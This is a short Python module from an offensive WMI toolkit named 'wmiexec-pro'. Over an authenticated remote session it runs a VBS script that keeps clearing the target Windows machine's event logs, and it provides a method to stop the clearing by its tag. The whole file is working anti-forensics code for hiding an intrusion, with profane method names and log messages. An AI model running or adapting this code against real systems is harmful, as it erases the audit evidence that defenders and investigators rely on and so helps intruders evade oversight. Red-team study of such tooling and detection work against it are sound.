import logging

from lib.helpers import get_vbs
from lib.methods.executeScript import executeScript_Toolkit


class eventlog_Toolkit():
    def __init__(self, iWbemLevel1Login):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.logger = logging.getLogger("wmiexec-pro")

    def fuck_EventLog(self):
        executer = executeScript_Toolkit(self.iWbemLevel1Login)
        tag = executer.ExecuteScript(script_content=get_vbs("ClearEventlog.vbs"), returnTag=True)
        self.logger.warning(f"Keepping note of this tag if you want to stop it: {tag}")
    
    def retrieve_EventLog(self, tag):
        executer = executeScript_Toolkit(self.iWbemLevel1Login)
        executer.remove_Event(tag)
        self.logger.info("Stop fucking eventlog :)")